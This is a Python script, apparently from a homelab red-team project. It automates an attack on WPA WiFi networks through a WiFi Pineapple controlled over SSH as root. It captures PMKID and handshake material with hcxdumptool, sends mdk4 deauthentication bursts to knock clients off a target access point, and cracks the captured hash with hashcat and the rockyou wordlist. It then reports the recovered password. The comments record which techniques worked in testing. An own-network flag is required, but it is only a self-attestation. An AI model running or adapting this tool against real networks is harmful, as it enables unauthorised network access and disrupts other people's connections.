#!/usr/bin/env python3
import argparse
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

from common.pineapple_client import PineappleClient
from common.notify import notify_all

PINEAPPLE_HOST = os.environ.get("PINEAPPLE_HOST", "192.168.1.50")
REMOTE_CAPTURE = "/tmp/capture.pcapng"
REMOTE_FILTER = "/tmp/targets.txt"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
RULE = "/usr/share/hashcat/rules/best64.rule"
NTFY_TOPIC = "homelab-redteam"
BSSID_RE = re.compile(r"^[0-9a-f]{12}$")


class ValidationError(Exception):
    pass


def validate_bssids(bssids):
    """Bare-hex, 12 lowercase hex chars, no separators — anything else is rejected outright.

    This is the injection boundary: normalized values get interpolated into a remote
    shell command string over SSH, so only a strict allowlist format may pass through.
    """
    bare = [b.replace(":", "").replace("-", "").lower() for b in bssids]
    for b in bare:
        if not BSSID_RE.match(b):
            raise ValidationError(f"'{b}' is not a valid bare-hex BSSID")
    return bare


def validate_channels(channels):
    out = [int(c) for c in channels]
    for c in out:
        if not 1 <= c <= 165:
            raise ValidationError(f"channel {c} out of range")
    return out


def ssh_run(cmd, timeout=20, background=False):
    full = ["sshpass", "-e", "ssh", "-o", "StrictHostKeyChecking=accept-new",
            f"root@{PINEAPPLE_HOST}", cmd]
    env = {**os.environ, "SSHPASS": os.environ["PINEAPPLE_ROOT_PASS"]}
    if background:
        subprocess.Popen(full, env=env)
        return None
    return subprocess.run(full, env=env, capture_output=True, text=True, timeout=timeout)


def scp_pull(remote_path, local_path, timeout=30):
    env = {**os.environ, "SSHPASS": os.environ["PINEAPPLE_ROOT_PASS"]}
    subprocess.run(
        ["sshpass", "-e", "scp", "-o", "StrictHostKeyChecking=accept-new",
         f"root@{PINEAPPLE_HOST}:{remote_path}", str(local_path)],
        env=env, check=True, timeout=timeout,
    )


def free_radio(client):
    client.handshakes_stop()
    client.recon_stop()
    ssh_run("pkill -f pineap; sleep 1; true")


def write_bssid_filter(validated_bare_bssids):
    quoted = " ".join(f"'{b}'" for b in validated_bare_bssids)
    ssh_run(f"printf '%s\\n' {quoted} > {REMOTE_FILTER}")


def start_capture(validated_channels):
    channel_arg = ",".join(str(c) for c in validated_channels)
    cmd = (f"(hcxdumptool -i wlan1mon -o {REMOTE_CAPTURE} "
           f"--filterlist_ap={REMOTE_FILTER} --filtermode=2 -c {channel_arg} "
           f"--enable_status=15 > /tmp/hcxdumptool.log 2>&1 &)")
    ssh_run(cmd)


def stop_capture_and_restart_daemons():
    ssh_run("pkill -f hcxdumptool; sleep 1; true")
    ssh_run("/etc/init.d/pineapd restart && /etc/init.d/pineapple restart", timeout=30)


def format_bssid_colons(validated_bare_bssid):
    """validated_bare_bssid must already be BSSID_RE-checked — this is the last stop before
    the value is interpolated into an mdk4 shell command, same injection boundary as
    write_bssid_filter."""
    pairs = [validated_bare_bssid[i:i + 2] for i in range(0, 12, 2)]
    return ":".join(pairs).upper()


def run_deauth_burst(bssid_colons, channel, burst_seconds, pps=50):
    """Confirmed 2026-07-08: the passive rogue-client PMKID technique alone gets nothing
    against a router that validates the MIC before replying (this one does). Forcing a real
    device to disconnect and reconnect while hcxdumptool is already listening captures a
    genuine 4-way handshake fragment from that device instead — this is what actually worked.
    mdk4's own process needs a hard kill (busybox has no timeout), same pattern as hcxdumptool."""
    ssh_run(f"(mdk4 wlan1mon d -B {bssid_colons} -c {channel} -s {pps} > /tmp/mdk4.log 2>&1 &)")
    time.sleep(burst_seconds)
    ssh_run("pkill -f 'mdk4 wlan1mon'; sleep 1; true")


def convert(local_pcapng, out_dir):
    hash_file = out_dir / "hash.22000"
    subprocess.run(["hcxpcapngtool", str(local_pcapng), "-o", str(hash_file)], check=True)
    if not hash_file.exists() or hash_file.stat().st_size == 0:
        return None
    return hash_file


def crack(hash_file, time_budget_s):
    """--backend-vector-width 1 is load-bearing, not a tuning knob: without it, pocl's
    SIMD-vectorized kernel for mode 22000 on this ARM CPU segfaults every worker thread on
    startup (confirmed 2026-07-08 via strace — SEGV_MAPERR right as threads wake from the
    compiled kernel). It crashes silently under subprocess.run, so a run "finishing" with no
    crack looked identical to a real negative result until this was traced. Mode 0 (MD5) and
    other simple hashes are unaffected — it's specific to mode 22000's more complex kernel."""
    subprocess.run(
        ["hashcat", "-m", "22000", str(hash_file), WORDLIST, "-r", RULE,
         "--runtime", str(time_budget_s), "--potfile-disable", "--quiet",
         "--backend-vector-width", "1"],
        capture_output=True, text=True,
    )
    shown = subprocess.run(["hashcat", "-m", "22000", str(hash_file), "--show"],
                            capture_output=True, text=True)
    return shown.stdout.strip() or None


def write_meta(out_dir, **fields):
    meta_file = out_dir / "meta.json"
    meta = json.loads(meta_file.read_text()) if meta_file.exists() else {}
    meta.update(fields)
    meta_file.write_text(json.dumps(meta))


def run_capture(bssids, channels, duration, crack_budget, use_deauth=False, deauth_seconds=15):
    """Shared pipeline used by both the CLI and the security-hub web form.

    Raises ValidationError on bad input before anything touches the network.
    Writes meta.json with started_at/duration/crack_budget/phase so a UI can show
    live progress without guessing — updated at each pipeline stage transition.

    use_deauth forces a reconnection (mdk4, targeting only the first bssid/channel pair)
    partway through the capture window instead of relying on the passive rogue-client
    technique alone — see run_deauth_burst for why this matters against MIC-validating APs.
    Returns (message, out_dir).
    """
    bare_bssids = validate_bssids(bssids)
    valid_channels = validate_channels(channels)

    out_dir = Path.home() / "captures" / time.strftime("%Y%m%d-%H%M%S")
    out_dir.mkdir(parents=True)
    write_meta(out_dir, started_at=time.time(), duration=duration,
               crack_budget=crack_budget, bssids=bssids, channels=channels,
               use_deauth=use_deauth, phase="capturing")

    client = PineappleClient()
    free_radio(client)
    write_bssid_filter(bare_bssids)
    start_capture(valid_channels)

    if use_deauth and duration > deauth_seconds + 3:
        time.sleep(3)  # let the capture stabilize before transmitting
        write_meta(out_dir, phase="deauthing")
        run_deauth_burst(format_bssid_colons(bare_bssids[0]), valid_channels[0], deauth_seconds)
        write_meta(out_dir, phase="capturing")  # back to listening for the reconnection
        time.sleep(duration - deauth_seconds - 3)
    else:
        time.sleep(duration)

    write_meta(out_dir, phase="pulling capture")
    stop_capture_and_restart_daemons()
    scp_pull(REMOTE_CAPTURE, out_dir / "capture.pcapng")

    write_meta(out_dir, phase="converting")
    hash_file = convert(out_dir / "capture.pcapng", out_dir)
    if hash_file is None:
        msg = "No handshake/PMKID material captured this run"
        (out_dir / "report.txt").write_text(msg + "\n")
        write_meta(out_dir, phase="done")
        notify_all(msg, "Handshake capture", NTFY_TOPIC)
        return msg, out_dir

    write_meta(out_dir, phase="cracking", cracking_started_at=time.time())
    password = crack(hash_file, crack_budget)
    msg = f"Cracked: {password}" if password else "Captured but not cracked within budget"
    (out_dir / "report.txt").write_text(msg + "\n")
    write_meta(out_dir, phase="done")
    notify_all(msg, "Handshake capture", NTFY_TOPIC)
    return msg, out_dir


def parse_args():
    parser = argparse.ArgumentParser(
        description="Automated PMKID/handshake capture + crack via the Pineapple. "
                    "Own network only — see the authorization boundary in the README.")
    parser.add_argument("--bssid", action="append", required=True, help="Target BSSID (repeatable)")
    parser.add_argument("--channel", action="append", required=True, type=int)
    parser.add_argument("--duration", type=int, default=90, help="Capture window in seconds")
    parser.add_argument("--crack-budget", type=int, default=600, help="hashcat runtime cap in seconds")
    parser.add_argument("--deauth", action="store_true",
                         help="Force a reconnection (mdk4) partway through the capture window, "
                              "targeting only the first --bssid/--channel pair")
    parser.add_argument("--deauth-seconds", type=int, default=15, help="Deauth burst duration")
    parser.add_argument("--confirm-own-network", action="store_true", required=True,
                         help="Required: confirms every target BSSID is your own network")
    return parser.parse_args()


def main():
    args = parse_args()
    try:
        msg, out_dir = run_capture(args.bssid, args.channel, args.duration, args.crack_budget,
                                    use_deauth=args.deauth, deauth_seconds=args.deauth_seconds)
    except ValidationError as e:
        print(f"Invalid input: {e}")
        sys.exit(2)
    print(f"{msg} — artifacts in {out_dir}")
    if "No handshake" in msg:
        sys.exit(1)


if __name__ == "__main__":
    main()
